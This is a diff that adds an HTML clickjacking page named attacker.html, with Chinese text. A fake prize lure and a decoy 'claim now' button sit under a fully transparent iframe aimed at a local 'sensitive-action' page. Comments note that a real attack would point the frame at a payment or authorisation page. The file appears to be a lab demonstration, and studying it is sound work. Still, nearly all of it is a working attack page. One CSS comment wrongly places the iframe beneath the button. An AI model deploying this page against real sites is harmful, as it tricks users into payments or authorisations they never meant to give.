@@ -1,0 +1,56 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>恭喜！您中奖了！</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .decoy-container {
+            position: relative;
+            text-align: center;
+        }
+        #decoy-btn {
+            padding: 20px 40px;
+            font-size: 24px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            z-index: 1;
+            position: relative; /* 确保按钮在 iframe 之上 */
+        }
+        #hidden-frame {
+            position: absolute;
+            top: 20px; /* 精确对齐到诱饵按钮的位置 */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 220px;
+            height: 70px; /* 与按钮高度一致 */
+            opacity: 0.0; /* 设置为完全透明 */
+            z-index: 2; /* 确保 iframe 在按钮之下，但因为透明，点击会穿透到它 */
+        }
+    </style>
+</head>
+<body>
+<div class="decoy-container">
+    <h1>恭喜您！您已被选为幸运硕士！</h1>
+    <p>点击下方按钮领取您的 院士录取通知书！</p>
+    <button id="decoy-btn">立即领取</button>
+
+    <!-- 这是攻击的核心：一个透明的 iframe 指向目标网站的敏感操作页面 -->
+    <!-- 注意：在实际攻击中，这个 URL 会是目标网站的某个带有敏感按钮（如“确认支付”、“授权”）的页面 -->
+    <iframe id="hidden-frame" src="http://localhost:8080/sensitive-action"></iframe>
+</div>
+</body>
+</html>
